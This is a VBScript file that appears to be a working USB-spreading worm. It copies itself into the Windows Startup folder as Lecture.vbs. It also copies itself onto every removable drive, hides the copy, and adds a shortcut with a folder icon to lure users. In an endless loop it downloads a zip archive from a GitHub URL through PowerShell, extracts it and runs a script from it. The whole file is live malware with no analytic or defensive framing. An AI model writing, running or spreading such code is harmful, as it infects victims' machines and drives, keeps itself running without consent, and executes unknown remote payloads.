Dim objFSO, objShell, objFolder, objFile

' Initialize objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Define paths
Dim selfScriptPath, startupFolderPath, lectureScriptPath, megaFolderPath, zipFilePath, zipExtractPath, url
selfScriptPath = WScript.ScriptFullName
startupFolderPath = objShell.SpecialFolders("Startup")
lectureScriptPath = startupFolderPath & "\Lecture.vbs"
megaFolderPath = "C:\Mega"
zipFilePath = megaFolderPath & "\MEGAcmd.zip"
zipExtractPath = megaFolderPath & "\MEGAcmd"
url = "https://github.com/snxerame/Mega/raw/main/MEGAcmd.zip"

' Check if Lecture.vbs exists in startup folder
If Not objFSO.FileExists(lectureScriptPath) Then
    ' Copy itself to startup folder as Lecture.vbs
    objFSO.CopyFile selfScriptPath, lectureScriptPath
End If

' Function to create shortcut
Sub CreateShortcut(targetPath, shortcutPath, iconPath)
    Dim objShortcut
    Set objShortcut = objShell.CreateShortcut(shortcutPath)
    objShortcut.TargetPath = targetPath
    objShortcut.IconLocation = iconPath
    objShortcut.Save
End Sub

' Function to hide file
Sub HideFile(filePath)
    If objFSO.FileExists(filePath) Then
        Dim objFile
        Set objFile = objFSO.GetFile(filePath)
        objFile.Attributes = objFile.Attributes + 2
    End If
End Sub

' Function to check and perform actions on removable drives
Sub CheckRemovableDrive()
    Dim drives, drive
    drives = objFSO.Drives
    
    For Each drive In drives
        If drive.DriveType = 1 Then ' DriveType 1 represents removable drives
            Dim drivePath, lectureOnDrivePath, shortcutPath
            drivePath = drive.Path
            lectureOnDrivePath = drivePath & "\Lecture.vbs"
            
            ' Check if Lecture.vbs exists on the drive
            If Not objFSO.FileExists(lectureOnDrivePath) Then
                ' Copy itself to pendrive as Lecture.vbs
                objFSO.CopyFile selfScriptPath, lectureOnDrivePath
                
                ' Create a shortcut with a folder icon
                shortcutPath = drivePath & "\Lecture.lnk"
                CreateShortcut lectureOnDrivePath, shortcutPath, "shell32.dll, 3"
                
                ' Hide the Lecture.vbs file
                HideFile lectureOnDrivePath
            End If
        End If
    Next
End Sub

' Main loop
Do
    ' Check for removable drives and perform actions
    CheckRemovableDrive
    
    ' Continue with the rest of the code
    
    ' Check if Mega folder exists
    If Not objFSO.FolderExists(megaFolderPath) Then
        ' Create Mega folder if it doesn't exist
        objFSO.CreateFolder(megaFolderPath)
        
        ' Download the zip file
        objShell.Run "powershell -command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFilePath & "')"""
        
        ' Check if zip file is downloaded
        Do While Not objFSO.FileExists(zipFilePath)
            WScript.Sleep 1000 ' Wait for 1 second
        Loop
        
        ' Extract the zip file
        If objFSO.FileExists(zipFilePath) Then
            Dim objShellApp
            Set objShellApp = CreateObject("Shell.Application")
            objShellApp.Namespace(zipExtractPath).CopyHere objShellApp.Namespace(zipFilePath).Items
            
            ' Check if zip file is extracted
            Do While Not objFSO.FolderExists(zipExtractPath)
                WScript.Sleep 1000 ' Wait for 1 second
            Loop
            
            ' Delete the zip file
            If objFSO.FolderExists(zipExtractPath) Then
                objFSO.DeleteFile(zipFilePath)
            End If
            
            ' Run file
            If objFSO.FolderExists(zipExtractPath) Then
                objShell.Run "cmd /c cd " & zipExtractPath & " && goder.vbs", 1, True
            End If
        End If
    Else
        ' Run file
        objShell.Run "cmd /c cd " & megaFolderPath & "\MEGAcmd && goder.vbs", 1, True
    End If
    
    ' Sleep for 5 seconds
    WScript.Sleep 5000
Loop
